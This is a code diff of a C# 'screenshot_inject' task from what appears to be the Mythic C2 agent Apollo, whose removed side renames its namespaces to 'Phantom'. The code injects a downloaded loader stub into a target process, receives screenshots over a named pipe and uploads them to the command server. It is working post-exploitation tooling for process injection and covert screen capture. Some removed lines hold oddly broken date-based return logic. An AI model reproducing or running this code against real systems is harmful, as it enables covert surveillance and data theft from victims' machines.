@@ -6,14 +6,14 @@
 
 #if SCREENSHOT_INJECT
 
-using PhantomInterop.Classes;
-using PhantomInterop.Classes.Core;
-using PhantomInterop.Classes.Events;
-using PhantomInterop.Enums.PhantomEnums;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Serializers;
-using PhantomInterop.Structs.PhantomStructs;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Classes.Core;
+using ApolloInterop.Classes.Events;
+using ApolloInterop.Enums.ApolloEnums;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Serializers;
+using ApolloInterop.Structs.ApolloStructs;
+using ApolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -42,48 +42,48 @@ namespace Tasks
             [DataMember(Name = "pid")]
             public int PID;
         }
-        private ConcurrentDictionary<string, ChunkStore<DataChunk>> DataStore = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
-        private AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
-        private AutoResetEvent _msgRecvEvent = new AutoResetEvent(false);
+        private ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
+        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
+        private AutoResetEvent _receiverEvent = new AutoResetEvent(false);
         private AutoResetEvent _putFilesEvent = new AutoResetEvent(false);
         private AutoResetEvent _pipeConnected = new AutoResetEvent(false);
 
-        private ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
+        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
         private ConcurrentQueue<byte[]> _putFilesQueue = new ConcurrentQueue<byte[]>();
-        private ConcurrentQueue<ICommandMessage> _msgRecvQueue = new ConcurrentQueue<ICommandMessage>();
-        private JsonHandler _serializer = new JsonHandler();
-        private AutoResetEvent _taskComplete = new AutoResetEvent(false);
-        private Action<object> _transmitAction;
+        private ConcurrentQueue<IMythicMessage> _receiverQueue = new ConcurrentQueue<IMythicMessage>();
+        private JsonSerializer _serializer = new JsonSerializer();
+        private AutoResetEvent _complete = new AutoResetEvent(false);
+        private Action<object> _sendAction;
         private Action<object> _putFilesAction;
         List<ST.Task<bool>> uploadTasks = new List<ST.Task<bool>>();
 
-        private bool _isFinished = false;
+        private bool _completed = false;
 
-        public screenshot_inject(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public screenshot_inject(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
-            _transmitAction = (object p) =>
+            _sendAction = (object p) =>
             {
                 PipeStream ps = (PipeStream)p;
-                while (ps.IsConnected && !_stopToken.IsCancellationRequested)
+                while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
                 {
                     WaitHandle.WaitAny(new WaitHandle[]
                     {
-                    _msgSendEvent,
-                    _stopToken.Token.WaitHandle,
-                    _taskComplete
+                    _senderEvent,
+                    _cancellationToken.Token.WaitHandle,
+                    _complete
                     });
-                    if (!_stopToken.IsCancellationRequested && ps.IsConnected && _msgSendQueue.TryDequeue(out byte[] result))
+                    if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
                     {
-                        ps.BeginWrite(result, 0, result.Length, ProcessSentMessage, p);
+                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                     }
                 }
-                _isFinished = true;
-                _taskComplete.Set();
+                _completed = true;
+                _complete.Set();
             };
             _putFilesAction = (object p) =>
             {
-                WaitHandle[] waiters = new WaitHandle[] { _putFilesEvent, _stopToken.Token.WaitHandle, _taskComplete };
-                while (!_stopToken.IsCancellationRequested && !_isFinished)
+                WaitHandle[] waiters = new WaitHandle[] { _putFilesEvent, _cancellationToken.Token.WaitHandle, _complete };
+                while (!_cancellationToken.IsCancellationRequested && !_completed)
                 {
                     WaitHandle.WaitAny(waiters);
                     if (_putFilesQueue.TryDequeue(out byte[] screen))
@@ -91,7 +91,7 @@ namespace Tasks
                         ST.Task<bool> uploadTask = new ST.Task<bool>(() =>
                         {
                             if (_agent.GetFileManager().PutFile(
-                                _stopToken.Token,
+                                _cancellationToken.Token,
                                 _data.ID,
                                 screen,
                                 null,
@@ -102,12 +102,12 @@ namespace Tasks
                                     mythicFileId,
                                     false,
                                     ""));
-                                if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+                                return true;
                             } else
                             {
-                                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                                return false;
                             }
-                        }, _stopToken.Token);
+                        }, _cancellationToken.Token);
                         uploadTasks.Add(uploadTask);
                         uploadTask.Start();
                     }
@@ -122,7 +122,7 @@ namespace Tasks
             MythicTaskResponse resp;
             try
             {
-                ScreenshotInjectParameters parameters = _dataSerializer.Deserialize<ScreenshotInjectParameters>(_data.Parameters);
+                ScreenshotInjectParameters parameters = _jsonSerializer.Deserialize<ScreenshotInjectParameters>(_data.Parameters);
                 if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                     string.IsNullOrEmpty(parameters.PipeName))
                 {
@@ -146,7 +146,7 @@ namespace Tasks
 
                     if (pidRunning)
                     {
-                        if (_agent.GetFileManager().GetFile(_stopToken.Token, _data.ID, parameters.LoaderStubId,
+                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
                                 out byte[] exeAsmPic))
                         {
                             var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
@@ -156,7 +156,7 @@ namespace Tasks
                                     "",
                                     false,
                                     "",
-                                    new ICommandMessage[]
+                                    new IMythicMessage[]
                                     {
                                         Artifact.ProcessInject(parameters.PID,
                                             _agent.GetInjectionManager().GetCurrentTechnique().Name)
@@ -179,26 +179,26 @@ namespace Tasks
                                     StringData = string.Format("{0} {1}", count, interval)
                                 };
                                 AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
-                                client.ConnectionEstablished += OnConnectionReady;
-                                client.MessageReceived += ProcessReceivedMessage;
-                                client.Disconnect += OnConnectionClosed;
+                                client.ConnectionEstablished += Client_ConnectionEstablished;
+                                client.MessageReceived += OnAsyncMessageReceived;
+                                client.Disconnect += Client_Disconnect;
                                 if (client.Connect(10000))
                                 {
-                                    DataChunk[] chunks = _serializer.SerializeIPCMessage(cmdargs);
-                                    foreach (DataChunk chunk in chunks)
+                                    IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
+                                    foreach (IPCChunkedData chunk in chunks)
                                     {
-                                        _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
+                                        _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                                     }
 
-                                    _msgSendEvent.Set();
+                                    _senderEvent.Set();
                                     WaitHandle[] waiters = new WaitHandle[]
                                     {
-                                        _taskComplete,
-                                        _stopToken.Token.WaitHandle
+                                        _complete,
+                                        _cancellationToken.Token.WaitHandle
                                     };
                                     WaitHandle.WaitAny(waiters);
                                     ST.Task.WaitAll(uploadTasks.ToArray());
-                                    
+                                    //bool bRet = uploadTasks.Where(t => t.Result == false).ToArray().Length == 0;
                                     bool bRet = uploadTasks.All(t => t.Result is true);
                                     if (bRet)
                                     {
@@ -244,48 +244,48 @@ namespace Tasks
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
-        private void OnConnectionClosed(object sender, PipeMessageData e)
+        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
         {
             e.Pipe.Close();
-            _msgSendEvent.Set();
+            _senderEvent.Set();
         }
 
-        private void OnConnectionReady(object sender, PipeMessageData e)
+        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
         {
-            System.Threading.Tasks.Task.Factory.StartNew(_transmitAction, e.Pipe, _stopToken.Token);
-            System.Threading.Tasks.Task.Factory.StartNew(_putFilesAction, null, _stopToken.Token);
+            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
+            System.Threading.Tasks.Task.Factory.StartNew(_putFilesAction, null, _cancellationToken.Token);
         }
 
-        private void ProcessSentMessage(IAsyncResult result)
+        private void OnAsyncMessageSent(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
-            
+            // Potentially delete this since theoretically the sender Task does everything
             if (pipe.IsConnected)
             {
                 pipe.EndWrite(result);
-                if (!_stopToken.IsCancellationRequested && _msgSendQueue.TryDequeue(out byte[] data))
+                if (!_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
                 {
-                    pipe.BeginWrite(data, 0, data.Length, ProcessSentMessage, pipe);
+                    pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
                 }
             }
         }
 
-        private void ProcessReceivedMessage(object sender, PipeMessageData args)
+        private void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
         {
-            DataChunk chunkedData = _dataSerializer.Deserialize<DataChunk>(
+            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                 Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
-            lock (DataStore)
+            lock (MessageStore)
             {
-                if (!DataStore.ContainsKey(chunkedData.ID))
+                if (!MessageStore.ContainsKey(chunkedData.ID))
                 {
-                    DataStore[chunkedData.ID] = new ChunkStore<DataChunk>();
-                    DataStore[chunkedData.ID].MessageComplete += HandleIncomingData;
+                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
+                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                 }
             }
-            DataStore[chunkedData.ID].AddMessage(chunkedData);
+            MessageStore[chunkedData.ID].AddMessage(chunkedData);
         }
 
-        private void HandleIncomingData(object sender, ChunkEventData<DataChunk> args)
+        private void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
             MessageType mt = args.Chunks[0].Message;
             List<byte> data = new List<byte>();
@@ -295,8 +295,8 @@ namespace Tasks
                 data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
             }
 
-            ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
-            
+            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
+            //Console.WriteLine("We got a message: {0}", mt.ToString());
 
             if (msg.GetTypeCode() != MessageType.ScreenshotInformation)
             {
